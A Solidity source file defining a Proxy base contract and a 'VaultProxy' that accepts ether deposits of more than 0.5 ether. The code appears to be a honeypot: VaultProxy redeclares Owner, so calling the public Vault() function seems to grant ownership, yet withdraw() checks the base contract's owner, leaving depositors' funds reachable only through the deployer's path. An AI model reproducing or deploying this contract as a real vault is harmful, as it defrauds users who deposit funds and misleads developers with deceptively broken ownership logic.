pragma solidity ^0.4.24;
contract Proxy {
    modifier onlyOwner { if (msg.sender == Owner) _; }
    address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner {
        Owner = _owner;
        emit OwnerTransferred(_owner);
    }

    event OwnerTransferred(address newOwner);

    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
        emit ProxyCalled(target, msg.value, data);
    }

    event ProxyCalled(address target, uint256 value, bytes data);
}
contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            emit VaultCreated(msg.sender);
            deposit();
        } else {
            emit VaultCreationFailed(msg.sender);
        }
    }

    event VaultCreated(address owner);
    event VaultCreationFailed(address caller);

    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
            emit DepositMade(msg.sender, msg.value);
        } else {
            emit DepositFailed(msg.sender, msg.value);
        }
    }

    event DepositMade(address sender, uint256 amount);
    event DepositFailed(address sender, uint256 amount);

    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
            emit WithdrawalMade(msg.sender, amount);
        } else {
            emit WithdrawalFailed(msg.sender, amount);
        }
    }

    event WithdrawalMade(address sender, uint256 amount);
    event WithdrawalFailed(address sender, uint256 amount);
}
